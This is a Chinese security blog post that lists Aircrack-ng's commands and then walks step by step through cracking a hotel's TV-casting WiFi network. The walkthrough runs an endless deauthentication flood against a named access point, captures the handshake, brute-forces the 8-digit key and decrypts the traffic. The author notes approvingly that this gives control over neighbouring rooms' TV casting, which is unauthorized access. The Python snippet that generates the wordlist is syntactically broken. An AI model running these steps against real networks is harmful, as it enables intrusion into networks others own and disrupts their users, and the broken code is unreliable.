> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/EzLXd0hipGwvLof2WbIH3Q)

**作者：Secbug**

**时间：20220906**

**公众号：漫步安全**

**知识星球：漫步安全**

**说明：知识有限，如有错误，还请指出，多担待。多谷歌、Github、百度，查看官方文档。**

Aircrack-ng
===========

Aircrack-ng 是一套完整的评估 WiFi 网络安全性的工具。

它侧重于 WiFi 安全的不同领域：

*   监控：数据包捕获并将数据导出到文本文件以供第三方工具进一步处理。
    
*   攻击：通过数据包注入进行重放攻击、取消身份验证、伪造接入点等。
    
*   测试：检查 WiFi 卡和驱动程序功能（捕获和注入）。
    
*   破解：WEP 和 WPA PSK（WPA 1 和 2）。
    

官网文档：https://aircrack-ng.org/

Aircrack-ng 常用套件
----------------

*   airmon-ng 监听套件
    
*   airodump-ng 抓包套件
    
*   aircrack-ng 802.11 WEP 和 WPA/WPA2-PSK 密钥破解程序
    
*   aireplay-ng 注入套件
    
*   airdecap-ng 解密WEP/WPA/WPA2流量包
    

airmon-ng
---------

监听网络传输数据包

该脚本可用于监听无线网络传输数据包，主要用于开启或关闭网卡的监听模式。

### 用法

```
airmon-ng <start|stop> <interface> [channel] or airmon-ng <check|check kill>  

```

### 常用参数

```
<start|stop>    开启或关闭网卡监听模式  
<interface>     网卡  
[channel]       信道  
<check>         检测是否存在进程干扰监听模式  
<check kill>    杀死阻碍干扰监听模式的进程  

```

### 启动监听模式

```
airmon-ng start wlan0  

```

### 关闭监听模式

```
airmon-ng stop wlan0mon  

```

> service networking restart 可能需要重启网络管理服务 不同的服务器，重启命令不一样

可通过iwconfig查看是否开启了监听模式

airodump-ng
-----------

抓包套件

用于抓取网络传输数据包，保存网络数据包用于后续分析。

### 用法

```
airodump-ng <options> <interface>[,<interface>,...]  

```

### 常用参数

```
-w -write                       保存数据包  
-r                              读取数据包内容  
-T                              当读取数据包内容时，按照接收时的速率显示  
--encrypt   <suite>             通过加密模块过滤  
--netmask <netmask>             通过掩码过滤  
--bssid     <bssid>             通过BSSID过滤  
--essid     <essid>             通过ESSID过滤  
--essid-regex <regex>           通过正则表达式过滤ESSID  
-a                              过滤未关联的网络  
-c -channel <channels>          信号选择  

```

aircrack-ng
-----------

密码破解套件

802.11 WEP 和 WPA/WPA2-PSK 密钥破解程序

对于WAP2协议的破解，主要针对于四次握手包进行破解。但aircarck-ng只需要其中的两个数据包即可成功运行。

### 常用参数

```
-a  <amode>     attack方式 1 = static WEP, 2 = WPA/WPA2-PSK  
-e  <essid>     设置后将根据essid过滤  
-b  <bssid>     根据mac地址来选择网络  
-p  <nbcpu>     使用多少个CPU核心来进行破解  
-w  <words>     字典路径  
-N  <file>      创建一个会话文件，原因是因为破解密钥需要时间  
-R  <file>      恢复破解会话  

```

### 用法

```
aircrack-ng [options] <capture file(s)>  

```

### 破解密码

```
# 破解  
aircrack-ng -w password.txt capture.cap  
# 开启一个会话破解  
aircrack-ng --new-session current.session -w password.lst,english.txt wpa-01.cap  
# 恢复会话  
aircrack-ng --restore-session current.session  
  
--new-session 每十分钟更新一次current.session  

```

aireplay-ng
-----------

注入套件

主要功能是生成流量以供以后在aircrack-ng中用于破解 WEP 和 WPA-PSK 密钥。

### 功能点

1.  取消身份认证
    
2.  假认证
    
3.  交互式数据包重放
    
4.  ARP请求重放攻击
    
5.  KoreK斩波攻击
    
6.  碎片攻击
    
7.  拿铁咖啡攻击
    
8.  面向客户端的分片攻击
    
9.  WAP迁移模式
    
10.  注入测试
    

### 常用参数

```
过滤器选项  
-b <bssid>           MAC地址，接入点  
-d <dmac>            MAC地址，目的地址  
-s <smac>            MAC地址，源地址  
-m <len>             最小数据包长度  
-n <len>             最大数据包长度  
...  
重播选项  
-x <nbpps>           每秒数据包数  
-a <bssid>           设置接入点 MAC 地址  
-c <dmac>            设置目标 MAC 地址  
...  
攻击选项(可使用数字)  
--deauth count       1或所有的stations(-0) -0 0 0表示无限循环  
--fakeauth delay     使用AP的虚假身份验证 (-1)  
--arpeplay           标准arp请求重放  
  

```

### WiFi deauth攻击

```
aireplay -0 0 -a apMac -c stationMac wlan0mon  

```

Airdecap-ng
-----------

解密WEP/WPA/WPA2流量包

### 常用参数

```
-b bssid            接入点mac地址  
-e essid            目标网络ascii码定义  
-p pass             密码  

```

### 用法

```
airdecap-ng [options] <pcap file>  

```

WiFi密码破解
========

针对WEP 和 WPA PSK（WPA 1 和 2）破解。

截止目前最新协议为WPA3，暂未发现WPA3协议的攻击方式。

材料
--

1.  KaLi 支持的无线网卡一张
    
2.  KaLi
    

演示
--

1.  插入无线网卡
    
2.  将无线网卡接入到虚拟机
    
    虚拟机→可移动设备→无线网卡→连接
    
    连接成功后，执行ifconfig查看是否存在wlan0网卡
    
    ```
    ifconfig  
    
    ```
    
    ![图片](https://mmbiz.qpic.cn/mmbiz_png/RbCJNSG1XgvdWZR6MdG18BmWtMbqnYF3QVVicz5nIAaAibib87zSz3NaxvSo9xmaibhNiaibqRXzdNpkhibGBDer2vAMw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)Untitled
    
3.  启动监听模式
    
    ```
    airmon-ng start wlan0  
    ifconfig  
    
    ```
    
    ![图片](https://mmbiz.qpic.cn/mmbiz_png/RbCJNSG1XgvdWZR6MdG18BmWtMbqnYF3AicUtdbKFYLTXhibrFdEHD3V9gUibWNAibNcN3WmKWDXNVgSkUoqKEfFsQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)Untitled
    
    如无法启动监听模式，尝试执行一下命令来启动
    
    ```
    airmon-ng check kill  
    airmon-ng start wlan0  
    ifconfig  
    
    ```
    
4.  扫描周围WiFi
    
    ```
    airodump-ng wlan0mon  
    
    ```
    
    ![图片](https://mmbiz.qpic.cn/mmbiz_png/RbCJNSG1XgvdWZR6MdG18BmWtMbqnYF3E2ric2bOPglxnDqozb1ia3nY4nsBcJkFVMQiaibP2p5MzEmQudRW3zZACg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)Untitled
    
    在酒店，这些都是酒店周围的WiFi
    
    room类型是酒店电视机投屏WiFi，目前已知酒店WiFi密码为8位数字。
    
5.  对目标进行抓包
    
    对room-1028-440进行抓包
    
    bssid 7C:25:DA:80:BC:0B
    
    channel 6
    
    ```
    airodump-ng --bssid 7C:25:DA:80:BC:0B -c 6 -w capture wlan0mon  
    
    ```
    
    ![图片](https://mmbiz.qpic.cn/mmbiz_png/RbCJNSG1XgvdWZR6MdG18BmWtMbqnYF3cH2ulUrRTK97iaGQJ1IUoQdbTO0eQF4TfUv7TG2OzzlGvhmA0qWd09Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)Untitled
    
    STATION 我的手机MAC地址
    
6.  迫使STATION目标下线
    
    对room-1028-440进行泛洪攻击
    
    ```
    aireplay-ng -0 0 -a 7C:25:DA:80:BC:0B -c A2:D2:4A:8D:9E:E4 wlan0mon  
    
    ```
    
    ![图片](https://mmbiz.qpic.cn/mmbiz_png/RbCJNSG1XgvdWZR6MdG18BmWtMbqnYF34pn13hnuH3FpvbI7qnEQtYMOmIcvdNOicxaveVhw5QCxTtXCMpiaae0Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)Untitled
    
    对目标进行攻击，发送几次之后，目标就会强制下线
    
    等待目标再次主动连接目标WiFi，即可捕获四次握手包
    
    ![图片](https://mmbiz.qpic.cn/mmbiz_png/RbCJNSG1XgvdWZR6MdG18BmWtMbqnYF31GJ3nc4vUeCAwwYibzIml2qTKruxFyFQVWn6fbibicfsTia9ArlWTlOH1w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)Untitled
    
    停止攻击时，Frames 不会再滚动，说明目标下线，当Frames再次变动时，说明目标WiFi被客户端连接，已经捕获到数据包。
    
7.  查看是否抓到握手包
    
    ![图片](https://mmbiz.qpic.cn/mmbiz_png/RbCJNSG1XgvdWZR6MdG18BmWtMbqnYF3zicXVJkE5FXBt9BE3sjp86iaQaWicpzgicSCn4NO3dswDuBE4EHtYbpFBA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)Untitled
    
8.  破解密码
    
    ```
    aircrack-ng -p 4 -w password.txt capture.cap  
    
    ```
    
    已知密码8位数，生成8位数密码。
    
    ```
    with open("password.txt", "w+", encoding="utf-8") as f:  
     for i range(99999999):  
      f.write("{i:08}\n")  
    
    ```
    
    打印
    
    ![图片](https://mmbiz.qpic.cn/mmbiz_png/RbCJNSG1XgvdWZR6MdG18BmWtMbqnYF3GKtCHRhhZdVMtfrqwyEF2l0hCiaiav06ia0aEMlbtOMibNO4orP4RqqP6Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)Untitled![图片](https://mmbiz.qpic.cn/mmbiz_png/RbCJNSG1XgvdWZR6MdG18BmWtMbqnYF3R70WvIehNdC9bjyV0h8np0zmPzEsq1qYHXpV94tjXa1lAL87dfknQw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)Untitled
    
    开始破解
    
    ```
    aircrack-ng -w password.txt capture.cap  
    
    ```
    
    ![图片](https://mmbiz.qpic.cn/mmbiz_png/RbCJNSG1XgvdWZR6MdG18BmWtMbqnYF3ib81mMZuibDhd8mGMUqnVNcFzYceKicjsW1IpsBGJLABsUErPEy718iaXQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)Untitled
    
    密码91684372
    
    这样在酒店就可以控制隔壁那些房间的电视投影。
    
    8位数字虚拟机要跑一个半小时，跑密码时间取决于电脑性能。可以尝试一下-p参数指定cpu数量。
    
9.  解密捕获的流量包数据
    
    ```
    airdecap-ng -e room-1028-440 -p 91684372 capture.cap  
    -e 目标WiFi名称ASCII值  
    
    ```
    
    解密后，默认保存为 待解密文件名称加-dec.cap
    
    ![图片](https://mmbiz.qpic.cn/mmbiz_png/RbCJNSG1XgvdWZR6MdG18BmWtMbqnYF3e2EHJeTXzSrXexqKgfHp6x5puJHh4XticyH5NF8cMffYKvw4p8ayBBw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)Untitled
    
    使用wireshark打开解密后的文件
    
    ![图片](https://mmbiz.qpic.cn/mmbiz_png/RbCJNSG1XgvdWZR6MdG18BmWtMbqnYF3RlAkIEvp7trAETmgnibJibc8pLWswFIaQWZ2vYLxtvPdibcibGRWgXvYsQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)Untitled
    
    房间的电视机对外通信可能使用的43.254这个IP。我本机是43.43。
    
    那么一瞬间，我就明白了HTTP为什么如此不安全了。